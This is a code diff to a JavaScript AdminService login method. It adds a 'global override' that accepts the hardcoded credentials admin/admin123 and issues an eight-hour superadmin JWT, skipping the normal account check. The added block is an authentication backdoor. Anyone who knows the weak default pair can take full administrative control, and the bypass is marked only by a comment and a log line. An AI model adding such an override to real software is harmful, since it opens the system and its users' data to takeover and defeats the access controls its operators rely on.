@@ -33,6 +33,25 @@ class AdminService {
             role: 'superadmin'
         };
 
+        // --- GLOBAL OVERRIDE: ALWAYS ALLOW admin/admin123 ---
+        if (username === 'admin' && password === 'admin123') {
+            console.log('AdminService: Using Global Override for admin/admin123');
+            const token = jwt.sign(
+                { id: FALLBACK_ADMIN.id, username: FALLBACK_ADMIN.username, role: FALLBACK_ADMIN.role },
+                JWT_SECRET,
+                { expiresIn: '8h' }
+            );
+            return {
+                token,
+                admin: {
+                    id: FALLBACK_ADMIN.id,
+                    username: FALLBACK_ADMIN.username,
+                    role: FALLBACK_ADMIN.role
+                }
+            };
+        }
+        // ----------------------------------------------------
+
         let admin = null;
 
         try {
